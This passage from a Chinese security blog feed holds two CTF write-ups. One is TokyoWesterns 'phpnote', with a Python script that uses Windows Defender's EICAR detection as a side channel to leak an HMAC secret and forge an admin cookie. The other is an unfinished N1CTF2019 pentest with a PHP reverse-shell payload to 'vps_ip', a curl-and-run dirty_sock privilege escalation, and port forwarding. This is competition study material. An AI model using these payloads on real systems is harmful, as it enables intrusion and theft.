class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Note</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($admin)</span> </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;notes = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;isadmin = $admin;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addnote</span><span class="params">($title, $body)</span> </span>{</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;notes, [$title, $body]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getnotes</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;notes;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isadmin === <span class="keyword">true</span>) {</span><br><span class="line">            <span class="keyword">echo</span> FLAG;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($data, $hmac)</span> </span>{</span><br><span class="line">    $secret = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($secret)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> hash_equals(hash_hmac(<span class="string">'sha256'</span>, $data, $secret), $hmac);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hmac</span><span class="params">($data)</span> </span>{</span><br><span class="line">    $secret = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data) || <span class="keyword">empty</span>($secret)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> hash_hmac(<span class="string">'sha256'</span>, $data, $secret);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_secret</span><span class="params">($seed)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> md5(SALT . $seed . PEPPER);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>($_SESSION[<span class="string">'secret'</span>]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">redirect</span><span class="params">($action)</span> </span>{</span><br><span class="line">    header(<span class="string">"Location: /?action=$action"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>];</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($action, [<span class="string">'index'</span>, <span class="string">'login'</span>, <span class="string">'logout'</span>, <span class="string">'post'</span>, <span class="string">'source'</span>, <span class="string">'getflag'</span>])) {</span><br><span class="line">    redirect(<span class="string">'index'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action === <span class="string">'source'</span>) {</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_login()) {</span><br><span class="line">    $realname = $_SESSION[<span class="string">'realname'</span>];</span><br><span class="line">    $nickname = $_SESSION[<span class="string">'nickname'</span>];</span><br><span class="line"></span><br><span class="line">    $note = verify($_COOKIE[<span class="string">'note'</span>], $_COOKIE[<span class="string">'hmac'</span>])</span><br><span class="line">            ? unserialize(base64_decode($_COOKIE[<span class="string">'note'</span>]))</span><br><span class="line">            : <span class="keyword">new</span> Note(<span class="keyword">false</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action === <span class="string">'login'</span>) {</span><br><span class="line">    <span class="keyword">if</span> ($method === <span class="string">'POST'</span>) {</span><br><span class="line">        $nickname = (string)$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        $realname = (string)$_POST[<span class="string">'realname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($realname) || strlen($realname) &lt; <span class="number">8</span>) {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'invalid name'</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $_SESSION[<span class="string">'realname'</span>] = $realname;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($nickname)) {</span><br><span class="line">            $_SESSION[<span class="string">'nickname'</span>] = $nickname;</span><br><span class="line">        }</span><br><span class="line">        $_SESSION[<span class="string">'secret'</span>] = gen_secret($nickname);</span><br><span class="line">    }</span><br><span class="line">    redirect(<span class="string">'index'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action === <span class="string">'logout'</span>) {</span><br><span class="line">    session_destroy();</span><br><span class="line">    redirect(<span class="string">'index'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action === <span class="string">'post'</span>) {</span><br><span class="line">    <span class="keyword">if</span> ($method === <span class="string">'POST'</span>) {</span><br><span class="line">        $title = (string)$_POST[<span class="string">'title'</span>];</span><br><span class="line">        $body = (string)$_POST[<span class="string">'body'</span>];</span><br><span class="line">        $note-&gt;addnote($title, $body);</span><br><span class="line">        $data = base64_encode(serialize($note));</span><br><span class="line">        setcookie(<span class="string">'note'</span>, (string)$data);</span><br><span class="line">        setcookie(<span class="string">'hmac'</span>, (string)hmac($data));</span><br><span class="line">    }</span><br><span class="line">    redirect(<span class="string">'index'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action === <span class="string">'getflag'</span>) {</span><br><span class="line">    $note-&gt;getflag();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//.....省略部分源码....</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>关键代码如下<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($data, $hmac)</span> </span>{</span><br><span class="line">    $secret = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($secret)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> hash_equals(hash_hmac(<span class="string">'sha256'</span>, $data, $secret), $hmac);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//....省略.....</span></span><br><span class="line">    $note = verify($_COOKIE[<span class="string">'note'</span>], $_COOKIE[<span class="string">'hmac'</span>])</span><br><span class="line">            ? unserialize(base64_decode($_COOKIE[<span class="string">'note'</span>]))</span><br><span class="line">            : <span class="keyword">new</span> Note(<span class="keyword">false</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>从上面代码可以看出cookie里面数据是经过签名校验的，但是我们<code>secret</code>不知道，所以直接伪造cookie这条路走不通了，由于php的<code>session</code>是以文件的形式保存的，也就是说我们可以把我们的恶意数据注入到<code>session</code>的文件中，从而触发<code>Windows Defender</code>的检测机制，但是我们怎么控制<code>session</code>文件内容呢，我们先看一下<code>session</code>文件保存的内容</p><p>我们用下面代码测试一下<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(SALT,<span class="string">"test"</span>);</span><br><span class="line">define(PEPPER, <span class="string">"test"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_secret</span><span class="params">($seed)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> md5(SALT . $seed . PEPPER);</span><br><span class="line">}</span><br><span class="line">session_start();</span><br><span class="line">$nickname = <span class="string">"rootroot"</span>;</span><br><span class="line">$realname = <span class="string">"adminadminadmin"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($realname) || strlen($realname) &lt; <span class="number">8</span>) {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'invalid name'</span>);</span><br><span class="line">}</span><br><span class="line">$_SESSION[<span class="string">'realname'</span>] = $realname;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($nickname)) {</span><br><span class="line">$_SESSION[<span class="string">'nickname'</span>] = $nickname;</span><br><span class="line">}</span><br><span class="line">        $_SESSION[<span class="string">'secret'</span>] = gen_secret($nickname);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>session</code>文件内容如下，第一次我们先post<code>nickname</code>为空，因为nickname是在<code>secret</code>先设置，如果我们不设置<code>nickname</code>为空，<code>nickname</code>的值会出现<code>secret</code>，导致我们注入恶意数据读取不了<code>secret</code>，我们可以看一下两者的区别<br>第一次post<code>nickname</code>值不为空时<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|s:15:"adminadminadmin";nickname|s:8:"rootroot";secret|s:32:"70034bb522e6f77c6f3e88d18b86c6df";</span><br></pre></td></tr></tbody></table></figure><p></p><p>第一次post<code>nickname</code>值为空时，第二次post个<code>rootroot</code><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|s:15:"adminadminadmin";secret|s:32:"70034bb522e6f77c6f3e88d18b86c6df";nickname|s:8:"rootroot";</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后<code>nickname</code>和<code>realname</code>的值我们可以控，所以我们可以在这两个值之间注入我们的恶意数据，例如<code>realname</code>为<code>&lt;script&gt;xxxxxx&lt;/script&gt;&lt;body&gt;</code>，然后<code>nickname</code>为：<code></code><br>闭合之后就是<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>xxxxxx<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>";secret|s:32:"70034bb522e6f77c6f3e88d18b86c6df";nickname|s:8:"<span class="tag">&lt;/<span class="name">body</span>&gt;</span>";</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后刚好secret在body标签内<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>";secret|s:32:"70034bb522e6f77c6f3e88d18b86c6df";nickname|s:8:"<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这意味着我们可以利用<code>document.body.innerHTML</code>读到我们的<code>secret</code></p><p>梳理一下攻击步骤，大致步骤如下：</p><ol><li>向session文件中注入恶意数据</li><li>利用Windows-Defender的检测机制，然后观察是否返回正常，如果检测的到恶意数据的话会登陆失败，否则则登陆成功</li><li>在<code>realname</code>和<code>nickname</code>之间嵌入JS脚本，然后逐字节泄露<code>secret</code></li></ol><p>改一下作者原来在WCTF上<code>Gyotaku</code>的脚本，跑一下<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://phpnote.chal.ctf.westerns.tokyo/?action="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(n=<span class="number">8</span>)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span><span class="params">(c, idx)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    prefix = randstr()</span><br><span class="line">    p = prefix + <span class="string">'''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">    payload = string.Template(p).substitute({<span class="string">'idx'</span>: idx, <span class="string">'c'</span>: c})</span><br><span class="line">    session = requests.session()</span><br><span class="line">    data_1 = {</span><br><span class="line">        <span class="string">"nickname"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"realname"</span>: <span class="string">"aaaaaaaaaaaaaaaaaaaaaa"</span></span><br><span class="line">    }</span><br><span class="line">    session.post(url + <span class="string">"login"</span>, data=data_1)</span><br><span class="line">    data_2 = {</span><br><span class="line">        <span class="string">"nickname"</span>: <span class="string">"&lt;/body&gt;"</span>,</span><br><span class="line">        <span class="string">"realname"</span>: payload</span><br><span class="line">    }</span><br><span class="line">    resp=session.post(url + <span class="string">"login"</span>, data=data_2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">    l, h = <span class="number">0</span>, <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">while</span> h - l &gt; <span class="number">1</span>:</span><br><span class="line">        m = (h + l) // <span class="number">2</span></span><br><span class="line">        flags = trigger(m, idx)</span><br><span class="line">        <span class="keyword">if</span> flags:</span><br><span class="line">            l = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h = m</span><br><span class="line">    <span class="keyword">return</span> chr(l)</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    data += leak(i)</span><br><span class="line">    print(data)</span><br></pre></td></tr></tbody></table></figure><p></p><p>跑一会，<code>secret</code>就跑出来了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909233328-2be928d8-d317-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后再用<code>secret</code>签名一下数据就能getflag了<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$secret = "2532bd172578d19923e5348420e02320";</span><br><span class="line">$note = new Note(true);</span><br><span class="line">$note-&gt;addnote("abc","abc");</span><br><span class="line">$data = base64_encode(serialize($note));</span><br><span class="line">echo $data.PHP_EOL;</span><br><span class="line">echo hash_hmac('sha256', $data, $secret).PHP_EOL;</span><br><span class="line">var_dump(verify($data,hash_hmac('sha256', $data, $secret)));</span><br></pre></td></tr></tbody></table></figure><p></p><p>改一下cookie访问<code>http://phpnote.chal.ctf.westerns.tokyo/?action=getflag</code>就能<code>getflag</code>了</p><p><code>TWCTF{h0pefully_I_haven't_made_a_m1stake_again}</code></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf" target="_blank" rel="noopener">https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf</a><br><a href="https://meizjm3i.github.io/2019/08/01/%E5%88%A9%E7%94%A8Windows%20Defender%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://meizjm3i.github.io/2019/08/01/%E5%88%A9%E7%94%A8Windows%20Defender%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 侧信道攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF2019渗透题题解</title>
      <link href="/2019/09/08/N1CTF2019%E6%B8%97%E9%80%8F%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
      <url>/2019/09/08/N1CTF2019%E6%B8%97%E9%80%8F%E9%A2%98%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Pentest-N1ctf2019-lab-step1"><a href="#Pentest-N1ctf2019-lab-step1" class="headerlink" title="Pentest N1ctf2019.lab(step1)"></a>Pentest N1ctf2019.lab(step1)</h2><p>链接：<a href="http://47.52.129.242/" target="_blank" rel="noopener">http://47.52.129.242/</a><br>web页面啥也没有，用nmap扫一波<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -P0 -T4 47.52.129.242 -vv</span><br></pre></td></tr></tbody></table></figure><p></p><p>扫描结果<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 128</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 128</span><br><span class="line">80/tcp open  http    syn-ack ttl 128</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现开放了<code>22</code>，<code>21</code>，<code>80</code>端口，猜测入口点应该是在<code>ftp</code>服务，发现可以匿名登陆</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908105616-3993ed62-d1e4-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>用<code>nmap</code>扫描一下版本<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -P0 -p 21 47.52.129.242 -vv</span><br></pre></td></tr></tbody></table></figure><p></p><p>扫描结果如下<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON          VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 128 ProFTPD 1.3.5rc3</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></tbody></table></figure><p></p><p>用msf找一下有没有<code>ProFTPD</code>这个版本的洞，发现有一个文件复制漏洞<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908110708-be5654a8-d1e5-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>尝试一波，发现可以写入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908111907-6b556a8a-d1e7-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>访问一下看看</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908112355-16d4c040-d1e8-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>为了方便操作，我们弹个shell回来<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qiyou.php?enjoy~=$sock+%3d+fsockopen("vps_ip",+6666)%3b$descriptorspec+%3d+array(0+%3d&gt;+$sock,1+%3d&gt;+$sock,2+%3d&gt;+$sock)%3b$process+%3d+proc_open('/bin/sh',+$descriptorspec,+$pipes)%3bproc_close($process)%3b</span><br></pre></td></tr></tbody></table></figure><p></p><p>根据题目提示，flag在<code>/root/flag.txt</code>里面，但是发现没有权限</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908112800-a8789b2a-d1e8-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>根据题目提示<code>snap</code>，猜测可能是要用<code>snap</code>提权，google一下这个版本的<code>snap</code>发现可以提权，直接用github上的脚本提权：<a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py" target="_blank" rel="noopener">链接</a><br>然后执行一波<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py &amp;&amp; python3 dirty_sockv2.py</span><br></pre></td></tr></tbody></table></figure><p></p><p>执行成功后会创建一个<code>dirty_sock</code>用户，密码也为<code>dirty_sock</code>。然后我们ssh连上去（php反弹shell的不能直接用su）就可以提权了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908153206-c27b1bfc-d20a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后就是getflag了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908153322-ef9cec78-d20a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="Pentest-N1ctf2019-lab-step2"><a href="#Pentest-N1ctf2019-lab-step2" class="headerlink" title="Pentest N1ctf2019.lab(step2)"></a>Pentest N1ctf2019.lab(step2)</h2><p>第一步渗透完了，猜测第二个flag应该是在内网的其它机器上面，我们用nmap扫描一下C段<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 -sS -T4 10.0.0.85/24</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现内网的一个<code>10.0.0.88</code>开放80端口</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908160618-89bf4752-d20f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>为了方便操作，我们用<code>lcx</code>把内网的<code>10.0.0.88</code>的80端口转发出来</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908165332-22a1c138-d216-1.png" alt="image.png"></p><p>查看源码发现有任意文件读取<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile.php?path=img/kerberos.jpg</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908164857-7eaeff82-d215-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>未完，带补充</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Redis中SSRF的利用</title>
      <link href="/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
